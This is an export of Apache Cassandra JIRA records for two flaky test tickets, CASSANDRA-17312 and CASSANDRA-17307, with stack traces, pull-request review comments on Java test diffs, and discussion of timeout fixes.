            Test that if a node fails to replace, it can join the cluster even if the data is wiped.
            """"""
>       self._test_restart_failed_replace(mode='wipe')

replace_address_test.py:479: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
replace_address_test.py:539: in _test_restart_failed_replace
    self.replacement_node.start(jvm_args=[""-Dcassandra.replace_address_first_boot={}""
../venv/lib/python3.8/site-packages/ccmlib/node.py:901: in start
    self.wait_for_binary_interface(from_mark=self.mark)
../venv/lib/python3.8/site-packages/ccmlib/node.py:689: in wait_for_binary_interface
    self.watch_log_for(""Starting listening for CQL clients"", **kwargs)
../venv/lib/python3.8/site-packages/ccmlib/node.py:588: in watch_log_for
    TimeoutError.raise_if_passed(start=start, timeout=timeout, node=self.name,
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

start = 1643238332.8472316, timeout = 90
msg = ""Missing: ['Starting listening for CQL clients'] not found in system.log:\n Head: INFO  [main] 2022-01-26 23:04:33,906...26 23:06:41,472 TokenMetadata.java:226 - Token -3193255413308472407 changing ownership from /127.0.0.3 to /127.0.0.4\n""
node = 'replacement'

    @staticmethod
    def raise_if_passed(start, timeout, msg, node=None):
        if start + timeout < time.time():
>           raise TimeoutError.create(start, timeout, msg, node)
E           ccmlib.node.TimeoutError: 26 Jan 2022 23:07:02 [replacement] after 90.12/90 seconds Missing: ['Starting listening for CQL clients'] not found in system.log:
E            Head: INFO  [main] 2022-01-26 23:04:33,906 YamlConfigura
E            Tail: ...endingRangeCalculator:1] 2022-01-26 23:06:41,472 TokenMetadata.java:226 - Token -3193255413308472407 changing ownership from /127.0.0.3 to /127.0.0.4

../venv/lib/python3.8/site-packages/ccmlib/node.py:56: TimeoutError
{code}

This test can be run isolation via 'pytest --force-resource-intensive-tests --cassandra-dir=~/cassandra replace_address_test.py::TestReplaceAddress::test_restart_failed_replace'",,bereng,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Feb 14 15:18:54 UTC 2022,,,,,,,All,,,,"0|z0z0vk:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/0d4fc63d7536616cf448a044d740955d308bc03a,,,,,,,,,CI,,,,,"10/Feb/22 20:24;brandon.williams;The issue here is that we simply don't wait long enough for 3.0 under the circumstances of the test any longer.

I suspect when [this delay|https://github.com/apache/cassandra/blob/cassandra-3.0/src/java/org/apache/cassandra/service/StorageService.java#L970] was added this test began failing, since combined with the [sleep a bit later|https://github.com/apache/cassandra/blob/cassandra-3.0/src/java/org/apache/cassandra/service/StorageService.java#L1007] it's just too long for ccm's default on wait_for_binary_proto of 90 seconds.

3.11 is also dangerously close to exceeding it after that addition, so the simplest thing to do is increase it to a safe amount, which I did [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17312].  And [here's a circle run|https://app.circleci.com/pipelines/github/driftx/cassandra/354/workflows/3822627d-f02a-4eca-b870-997b7818ee95] with it passing repeatedly on 3.0.;;;","14/Feb/22 08:30;bereng;Yep common problem and common fix. +1.;;;","14/Feb/22 15:18;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability,CASSANDRA-17307,13425004,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,jmckenzie,jmckenzie,26/Jan/22 18:08,05/Oct/22 22:22,13/Jul/23 08:40,05/Jul/22 11:34,4.1-beta1,5.0,,,,,Test/dtest/java,,,,0,,"No known failures. Flakiness 0%, Stability 100%

Error Message
Unexpected error while reading in case write-read consistency QUORUM-QUORUM with not upgraded coordinator and 1 nodes down

{code}
Stacktrace
junit.framework.AssertionFailedError: Unexpected error while reading in case write-read consistency QUORUM-QUORUM with not upgraded coordinator and 1 nodes down
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase$Tester.test(MixedModeAvailabilityTestBase.java:142)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase.lambda$testAvailability$2(MixedModeAvailabilityTestBase.java:91)
	at org.apache.cassandra.distributed.upgrade.UpgradeTestBase$TestCase.run(UpgradeTestBase.java:231)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase.testAvailability(MixedModeAvailabilityTestBase.java:93)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase.testAvailability(MixedModeAvailabilityTestBase.java:62)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase.testAvailability(MixedModeAvailabilityTestBase.java:56)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability(MixedModeAvailabilityV30Test.java:33)
Caused by: java.lang.RuntimeException: org.apache.cassandra.exceptions.ReadTimeoutException: Operation timed out - received only 1 responses.
	at org.apache.cassandra.distributed.impl.IsolatedExecutor.waitOn(IsolatedExecutor.java:218)
	at org.apache.cassandra.distributed.impl.IsolatedExecutor.lambda$sync$5(IsolatedExecutor.java:109)
	at org.apache.cassandra.distributed.impl.Coordinator.executeWithResult(Coordinator.java:69)
	at org.apache.cassandra.distributed.api.ICoordinator.execute(ICoordinator.java:32)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase$Tester.lambda$test$1(MixedModeAvailabilityTestBase.java:135)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase$Tester.maybeFail(MixedModeAvailabilityTestBase.java:155)
	at org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityTestBase$Tester.test(MixedModeAvailabilityTestBase.java:134)
Caused by: org.apache.cassandra.exceptions.ReadTimeoutException: Operation timed out - received only 1 responses.
	at org.apache.cassandra.service.ReadCallback.awaitResults(ReadCallback.java:136)
	at org.apache.cassandra.service.ReadCallback.get(ReadCallback.java:142)
	at org.apache.cassandra.service.AbstractReadExecutor.get(AbstractReadExecutor.java:145)
	at org.apache.cassandra.service.StorageProxy$SinglePartitionReadLifecycle.awaitResultsAndRetryOnDigestMismatch(StorageProxy.java:1833)
	at org.apache.cassandra.service.StorageProxy.fetchRows(StorageProxy.java:1782)
	at org.apache.cassandra.service.StorageProxy.readRegular(StorageProxy.java:1720)
	at org.apache.cassandra.service.StorageProxy.read(StorageProxy.java:1629)
	at org.apache.cassandra.db.SinglePartitionReadCommand$Group.execute(SinglePartitionReadCommand.java:1166)
	at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:302)
	at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:263)
	at org.apache.cassandra.cql3.statements.SelectStatement.execute(SelectStatement.java:115)
	at org.apache.cassandra.distributed.impl.Coordinator.executeInternal(Coordinator.java:107)
	at org.apache.cassandra.distributed.impl.Coordinator.lambda$executeWithResult$0(Coordinator.java:69)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.cassandra.concurrent.NamedThreadFactory.lambda$threadLocalDeallocator$0(NamedThreadFactory.java:83)
	at java.lang.Thread.run(Thread.java:748)
{code}",,adelapena,bereng,jmckenzie,,,,,,,,,,,,"adelapena commented on code in PR #1714:
URL: https://github.com/apache/cassandra/pull/1714#discussion_r912832176


##########
test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java:
##########
@@ -18,77 +18,129 @@
 
 package org.apache.cassandra.distributed.upgrade;
 
-import java.util.Arrays;
-import java.util.List;
 import java.util.UUID;
+import java.util.concurrent.RejectedExecutionException;
 
-import com.vdurmont.semver4j.Semver;
+import org.junit.Test;
 
+import com.vdurmont.semver4j.Semver;
 import org.apache.cassandra.distributed.api.ConsistencyLevel;
 import org.apache.cassandra.distributed.api.ICoordinator;
+import org.apache.cassandra.exceptions.ReadFailureException;
 import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteFailureException;
 import org.apache.cassandra.exceptions.WriteTimeoutException;
 import org.apache.cassandra.net.Verb;
+import org.assertj.core.api.Assertions;
 
+import static java.lang.String.format;
 import static java.util.concurrent.TimeUnit.SECONDS;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.QUORUM;
 import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
 import static org.apache.cassandra.distributed.shared.AssertUtils.row;
 import static org.apache.cassandra.net.Verb.READ_REQ;
-import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertFalse;
-import static java.lang.String.format;
 
 
-public class MixedModeAvailabilityTestBase extends UpgradeTestBase
+public abstract class MixedModeAvailabilityTestBase extends UpgradeTestBase
 {
     private static final int NUM_NODES = 3;
     private static final int COORDINATOR = 1;
-    private static final List<Tester> TESTERS = Arrays.asList(new Tester(ONE, ALL),
-                                                              new Tester(QUORUM, QUORUM),
-                                                              new Tester(ALL, ONE));
+    private static final String INSERT = withKeyspace(""INSERT INTO %s.t (k, c, v) VALUES (?, ?, ?)"");
+    private static final String SELECT = withKeyspace(""SELECT * FROM %s.t WHERE k = ?"");
 
+    private final Semver initial;
+    private final ConsistencyLevel writeConsistencyLevel;
+    private final ConsistencyLevel readConsistencyLevel;
+
+    public MixedModeAvailabilityTestBase(Semver initial, ConsistencyLevel writeConsistencyLevel, ConsistencyLevel readConsistencyLevel)
+    {
+        this.initial = initial;
+        this.writeConsistencyLevel = writeConsistencyLevel;
+        this.readConsistencyLevel = readConsistencyLevel;
+    }
 
-    protected static void testAvailability(Semver initial) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorNotUpgraded() throws Throwable
     {
-        testAvailability(initial, UpgradeTestBase.CURRENT);
+        testAvailability(false, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
-    protected static void testAvailability(Semver initial, Semver upgrade) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorUpgraded() throws Throwable
     {
-        testAvailability(true, initial, upgrade);
-        testAvailability(false, initial, upgrade);
+        testAvailability(true, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
     private static void testAvailability(boolean upgradedCoordinator,
                                          Semver initial,
-                                         Semver upgrade) throws Throwable
+                                         ConsistencyLevel writeConsistencyLevel,
+                                         ConsistencyLevel readConsistencyLevel) throws Throwable
     {
         new TestCase()
         .nodes(NUM_NODES)
         .nodesToUpgrade(upgradedCoordinator ? 1 : 2)
-        .upgrades(initial, upgrade)
-        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(2))
-                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(2)))
-        .setup(c -> c.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c))"")))
+        .upgrades(initial, UpgradeTestBase.CURRENT)
+        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(5))
+                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(5)))
+        // use retry of 10ms so that each check is consistent
+        // At the start of the world cfs.sampleLatencyNanos == 0, which means speculation acts as if ALWAYS is done,
+        // but after the first refresh this gets set high enough that we don't trigger speculation for the rest of the test!
+        // To be consistent set retry to 10ms so cfs.sampleLatencyNanos stays consistent for the duration of the test.
+        .setup(cluster -> {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c)) WITH speculative_retry = '10ms'""));
+            cluster.setUncaughtExceptionsFilter(throwable -> throwable instanceof RejectedExecutionException);
+        })
         .runAfterNodeUpgrade((cluster, n) -> {
 
+            ICoordinator coordinator = cluster.coordinator(COORDINATOR);
+
             // using 0 to 2 down nodes...
-            for (int numNodesDown = 0; numNodesDown < NUM_NODES; numNodesDown++)
+            for (int i = 0; i < NUM_NODES; i++)
             {
+                final int numNodesDown = i;

Review Comment:
   We need a `final` copy of the non-final `i`, so we can use it in the lambda that we pass to the second call to `maybeFail`, [here](https://github.com/apache/cassandra/blob/f3e082990e00cc54b9e24212c2ab6da8f937344d/test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java#L130).



;04/Jul/22 09:51;githubbot;600","adelapena commented on code in PR #1714:
URL: https://github.com/apache/cassandra/pull/1714#discussion_r912840989


##########
test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java:
##########
@@ -18,77 +18,129 @@
 
 package org.apache.cassandra.distributed.upgrade;
 
-import java.util.Arrays;
-import java.util.List;
 import java.util.UUID;
+import java.util.concurrent.RejectedExecutionException;
 
-import com.vdurmont.semver4j.Semver;
+import org.junit.Test;
 
+import com.vdurmont.semver4j.Semver;
 import org.apache.cassandra.distributed.api.ConsistencyLevel;
 import org.apache.cassandra.distributed.api.ICoordinator;
+import org.apache.cassandra.exceptions.ReadFailureException;
 import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteFailureException;
 import org.apache.cassandra.exceptions.WriteTimeoutException;
 import org.apache.cassandra.net.Verb;
+import org.assertj.core.api.Assertions;
 
+import static java.lang.String.format;
 import static java.util.concurrent.TimeUnit.SECONDS;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.QUORUM;
 import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
 import static org.apache.cassandra.distributed.shared.AssertUtils.row;
 import static org.apache.cassandra.net.Verb.READ_REQ;
-import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertFalse;
-import static java.lang.String.format;
 
 
-public class MixedModeAvailabilityTestBase extends UpgradeTestBase
+public abstract class MixedModeAvailabilityTestBase extends UpgradeTestBase
 {
     private static final int NUM_NODES = 3;
     private static final int COORDINATOR = 1;
-    private static final List<Tester> TESTERS = Arrays.asList(new Tester(ONE, ALL),
-                                                              new Tester(QUORUM, QUORUM),
-                                                              new Tester(ALL, ONE));
+    private static final String INSERT = withKeyspace(""INSERT INTO %s.t (k, c, v) VALUES (?, ?, ?)"");
+    private static final String SELECT = withKeyspace(""SELECT * FROM %s.t WHERE k = ?"");
 
+    private final Semver initial;
+    private final ConsistencyLevel writeConsistencyLevel;
+    private final ConsistencyLevel readConsistencyLevel;
+
+    public MixedModeAvailabilityTestBase(Semver initial, ConsistencyLevel writeConsistencyLevel, ConsistencyLevel readConsistencyLevel)
+    {
+        this.initial = initial;
+        this.writeConsistencyLevel = writeConsistencyLevel;
+        this.readConsistencyLevel = readConsistencyLevel;
+    }
 
-    protected static void testAvailability(Semver initial) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorNotUpgraded() throws Throwable
     {
-        testAvailability(initial, UpgradeTestBase.CURRENT);
+        testAvailability(false, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
-    protected static void testAvailability(Semver initial, Semver upgrade) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorUpgraded() throws Throwable
     {
-        testAvailability(true, initial, upgrade);
-        testAvailability(false, initial, upgrade);
+        testAvailability(true, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
     private static void testAvailability(boolean upgradedCoordinator,
                                          Semver initial,
-                                         Semver upgrade) throws Throwable
+                                         ConsistencyLevel writeConsistencyLevel,
+                                         ConsistencyLevel readConsistencyLevel) throws Throwable
     {
         new TestCase()
         .nodes(NUM_NODES)
         .nodesToUpgrade(upgradedCoordinator ? 1 : 2)
-        .upgrades(initial, upgrade)
-        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(2))
-                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(2)))
-        .setup(c -> c.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c))"")))
+        .upgrades(initial, UpgradeTestBase.CURRENT)
+        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(5))
+                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(5)))
+        // use retry of 10ms so that each check is consistent
+        // At the start of the world cfs.sampleLatencyNanos == 0, which means speculation acts as if ALWAYS is done,
+        // but after the first refresh this gets set high enough that we don't trigger speculation for the rest of the test!
+        // To be consistent set retry to 10ms so cfs.sampleLatencyNanos stays consistent for the duration of the test.
+        .setup(cluster -> {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c)) WITH speculative_retry = '10ms'""));
+            cluster.setUncaughtExceptionsFilter(throwable -> throwable instanceof RejectedExecutionException);
+        })
         .runAfterNodeUpgrade((cluster, n) -> {
 
+            ICoordinator coordinator = cluster.coordinator(COORDINATOR);
+
             // using 0 to 2 down nodes...
-            for (int numNodesDown = 0; numNodesDown < NUM_NODES; numNodesDown++)
+            for (int i = 0; i < NUM_NODES; i++)
             {
+                final int numNodesDown = i;
+
                 // disable communications to the down nodes
                 if (numNodesDown > 0)
                 {
                     cluster.filters().outbound().verbs(READ_REQ.id).to(replica(COORDINATOR, numNodesDown)).drop();
                     cluster.filters().outbound().verbs(Verb.MUTATION_REQ.id).to(replica(COORDINATOR, numNodesDown)).drop();
                 }
 
-                // run the test cases that are compatible with the number of down nodes
-                ICoordinator coordinator = cluster.coordinator(COORDINATOR);
-                for (Tester tester : TESTERS)
-                    tester.test(coordinator, numNodesDown, upgradedCoordinator);
+                UUID key = UUID.randomUUID();
+                Object[] row1 = row(key, 1, 10);
+                Object[] row2 = row(key, 2, 20);
+
+                boolean wrote = false;
+                try
+                {
+                    // test write
+                    maybeFail(false, numNodesDown > maxNodesDown(writeConsistencyLevel), () -> {
+                        coordinator.execute(INSERT, writeConsistencyLevel, row1);
+                        coordinator.execute(INSERT, writeConsistencyLevel, row2);
+                    });
+
+                    wrote = true;
+
+                    // test read
+                    maybeFail(true, numNodesDown > maxNodesDown(readConsistencyLevel), () -> {
+                        Object[][] rows = coordinator.execute(SELECT, readConsistencyLevel, key);
+                        if (numNodesDown <= maxNodesDown(writeConsistencyLevel))

Review Comment:
   The read CL is used as the `shouldFail` argument of the call to `maybeFail`. That should check that reads succeed or fail depending on the CL and down nodes. Once we know that the query succeeds, this check verifies the read query contents. This is only done if the writes have succeeded and left something to read, and for that we need to check the write CL.
   
   This part comes more or less unmodified from the original test: https://github.com/apache/cassandra/blob/trunk/test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java#L148-L149



;04/Jul/22 10:01;githubbot;600","bereng commented on code in PR #1714:
URL: https://github.com/apache/cassandra/pull/1714#discussion_r912854992


##########
test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java:
##########
@@ -18,77 +18,129 @@
 
 package org.apache.cassandra.distributed.upgrade;
 
-import java.util.Arrays;
-import java.util.List;
 import java.util.UUID;
+import java.util.concurrent.RejectedExecutionException;
 
-import com.vdurmont.semver4j.Semver;
+import org.junit.Test;
 
+import com.vdurmont.semver4j.Semver;
 import org.apache.cassandra.distributed.api.ConsistencyLevel;
 import org.apache.cassandra.distributed.api.ICoordinator;
+import org.apache.cassandra.exceptions.ReadFailureException;
 import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteFailureException;
 import org.apache.cassandra.exceptions.WriteTimeoutException;
 import org.apache.cassandra.net.Verb;
+import org.assertj.core.api.Assertions;
 
+import static java.lang.String.format;
 import static java.util.concurrent.TimeUnit.SECONDS;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
 import static org.apache.cassandra.distributed.api.ConsistencyLevel.QUORUM;
 import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
 import static org.apache.cassandra.distributed.shared.AssertUtils.row;
 import static org.apache.cassandra.net.Verb.READ_REQ;
-import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertFalse;
-import static java.lang.String.format;
 
 
-public class MixedModeAvailabilityTestBase extends UpgradeTestBase
+public abstract class MixedModeAvailabilityTestBase extends UpgradeTestBase
 {
     private static final int NUM_NODES = 3;
     private static final int COORDINATOR = 1;
-    private static final List<Tester> TESTERS = Arrays.asList(new Tester(ONE, ALL),
-                                                              new Tester(QUORUM, QUORUM),
-                                                              new Tester(ALL, ONE));
+    private static final String INSERT = withKeyspace(""INSERT INTO %s.t (k, c, v) VALUES (?, ?, ?)"");
+    private static final String SELECT = withKeyspace(""SELECT * FROM %s.t WHERE k = ?"");
 
+    private final Semver initial;
+    private final ConsistencyLevel writeConsistencyLevel;
+    private final ConsistencyLevel readConsistencyLevel;
+
+    public MixedModeAvailabilityTestBase(Semver initial, ConsistencyLevel writeConsistencyLevel, ConsistencyLevel readConsistencyLevel)
+    {
+        this.initial = initial;
+        this.writeConsistencyLevel = writeConsistencyLevel;
+        this.readConsistencyLevel = readConsistencyLevel;
+    }
 
-    protected static void testAvailability(Semver initial) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorNotUpgraded() throws Throwable
     {
-        testAvailability(initial, UpgradeTestBase.CURRENT);
+        testAvailability(false, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
-    protected static void testAvailability(Semver initial, Semver upgrade) throws Throwable
+    @Test
+    public void testAvailabilityCoordinatorUpgraded() throws Throwable
     {
-        testAvailability(true, initial, upgrade);
-        testAvailability(false, initial, upgrade);
+        testAvailability(true, initial, writeConsistencyLevel, readConsistencyLevel);
     }
 
     private static void testAvailability(boolean upgradedCoordinator,
                                          Semver initial,
-                                         Semver upgrade) throws Throwable
+                                         ConsistencyLevel writeConsistencyLevel,
+                                         ConsistencyLevel readConsistencyLevel) throws Throwable
     {
         new TestCase()
         .nodes(NUM_NODES)
         .nodesToUpgrade(upgradedCoordinator ? 1 : 2)
-        .upgrades(initial, upgrade)
-        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(2))
-                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(2)))
-        .setup(c -> c.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c))"")))
+        .upgrades(initial, UpgradeTestBase.CURRENT)
+        .withConfig(config -> config.set(""read_request_timeout_in_ms"", SECONDS.toMillis(5))
+                                    .set(""write_request_timeout_in_ms"", SECONDS.toMillis(5)))
+        // use retry of 10ms so that each check is consistent
+        // At the start of the world cfs.sampleLatencyNanos == 0, which means speculation acts as if ALWAYS is done,
+        // but after the first refresh this gets set high enough that we don't trigger speculation for the rest of the test!
+        // To be consistent set retry to 10ms so cfs.sampleLatencyNanos stays consistent for the duration of the test.
+        .setup(cluster -> {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (k uuid, c int, v int, PRIMARY KEY (k, c)) WITH speculative_retry = '10ms'""));
+            cluster.setUncaughtExceptionsFilter(throwable -> throwable instanceof RejectedExecutionException);
+        })
         .runAfterNodeUpgrade((cluster, n) -> {
 
+            ICoordinator coordinator = cluster.coordinator(COORDINATOR);
+
             // using 0 to 2 down nodes...
-            for (int numNodesDown = 0; numNodesDown < NUM_NODES; numNodesDown++)
+            for (int i = 0; i < NUM_NODES; i++)
             {
+                final int numNodesDown = i;

Review Comment:
   sgtm right



;04/Jul/22 10:17;githubbot;600","smiklosovic closed pull request #1715: CASSANDRA-17307 trunk: Flaky MixedModeAvailability tests
URL: https://github.com/apache/cassandra/pull/1715


;06/Jul/22 19:36;githubbot;600","smiklosovic closed pull request #1714: CASSANDRA-17307 4.1: Flaky MixedModeAvailability tests
URL: https://github.com/apache/cassandra/pull/1714


;06/Jul/22 19:37;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3000,,,0,3000,,,,,,,,,CASSANDRA-17310,,,CASSANDRA-17310,,,,,,,,,CASSANDRA-17641,CASSANDRA-17642,CASSANDRA-17651,CASSANDRA-17652,,,CASSANDRA-17636,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jul 05 11:33:58 UTC 2022,,,,,,,All,,,,"0|z0yzhk:",9223372036854775807,,,,bereng,berenguerblasi@gmail.com,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/91d08e496ee439a2179e617f4db8804ab07c301a,,,,,,,,,"[https://github.com/apache/cassandra/pull/1714]
[https://github.com/apache/cassandra/pull/1715]",,,,,"13/Jun/22 14:25;adelapena;[Repeated runs|https://app.circleci.com/pipelines/github/adelapena/cassandra/1680/workflows/f8c846a3-7768-4326-b7cb-e25da4dab2d7/jobs/17618] of this test hit both the timeout mentioned on the description and the failure reported on CASSANDRA-17641, CASSANDRA-17642, CASSANDRA-17651 and CASSANDRA-17652.

The test combines queries expected to succeed with writes expected to timeout. One one hand, the queries that should succeed require a timeout config large enough to avoid accidentally timeouts queries due to a slow env. One the other hand, the queries that should timeout benefit from a not-so-long timeout config so the entire test doesn't hit a JUnit timeout.

I guess that what we can do here is increasing the query timeout config, so the queries expected to succeed don't timeout on the coordinator, and also split the test into multiple classes so there are less queries per test. That ways the queries that should timeout on the coordinator wouldn't produce a Junit timeout.

The problem is that the {{ShutdownException}} reported on the other tickets is far more common than the timeout, so it's difficult to solve the timeout without fixing the {{ShutdownException}} bug before.;;;","01/Jul/22 05:21;bereng;Agreed CASSANDRA-17636 is the probable root cause. It didn't repro now that it has been merged. Should we optimistically close and reopen if needed [~adelapena]?;;;","01/Jul/22 10:06;adelapena;[~bereng] I'm afraid that there is more than CASSANDRA-17636 going on here. As mentioned in my comment above, the test hits CASSANDRA-17636 quite frequently but it also has a problem due to timeouts. The error reported on the description is one of these. It can still be reproduced after applying the patch for CASSANDRA-17636, as it's shown by [this run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1807/workflows/96f294f3-b960-41d0-a82a-a1f8e8ead584].

The patch spitting the test is almost ready, I'll publish it in a bit.;;;","01/Jul/22 14:09;adelapena;The proposed patches for [4.1|https://github.com/apache/cassandra/pull/1714] and [trunk|https://github.com/apache/cassandra/pull/1715] split {{MixedModeAvailability*}} tests so each read-write consistency level pair is tested on its own class. That gives us a lower runtime for each class, so we can increase query timeouts a bit without hitting the JUnit timeout.

The patch for 4.1 also ports back the fixes applied to {{MixedModeAvailabilityTestBase}} in trunk by CASSANDRA-17656 and CASSANDRA-16586.

Here are repeated runs for the six test classes extending {{{}MixedModeAvailabilityTestBase{}}}:

||branch||test||CI||
|4.1  |MixedModeAvailabilityV30QuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1813/workflows/75d8e60f-dc24-4005-bcbe-172efd3887a0]|
|4.1  |MixedModeAvailabilityV30AllOneTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1814/workflows/0cb75206-b484-4606-bc86-c47b173464a6]|
|4.1  |MixedModeAvailabilityV30OneAllTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1815/workflows/09bee6a5-7cb6-4da7-b322-8ed23d31ad95]|
|4.1  |MixedModeAvailabilityV3XQuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1816/workflows/81cfb913-154a-4764-96ac-b2392783c1d4]|
|4.1  |MixedModeAvailabilityV3XAllOneTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1817/workflows/ac077a73-4061-48f7-96fa-cc6c151c0f53]|
|4.1  |MixedModeAvailabilityV3XOneAllTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1818/workflows/728e5d73-0468-4ce8-8cc0-dfd512c0983f]|
|trunk|MixedModeAvailabilityV30QuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1819/workflows/d667e5ee-5ae9-4299-b42c-b15f29a11767]|
|trunk|MixedModeAvailabilityV30AllOneTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1820/workflows/635ca51a-5e0c-4b36-addb-c494811c2555]|
|trunk|MixedModeAvailabilityV30OneAllTest      |[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1821/workflows/16828e0b-523b-402e-b65d-aed6f928d958]|
|trunk|MixedModeAvailabilityV3XQuorumQuorumTest|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1822/workflows/60e11ef1-00b5-4655-9156-60536b4b9ef7]|
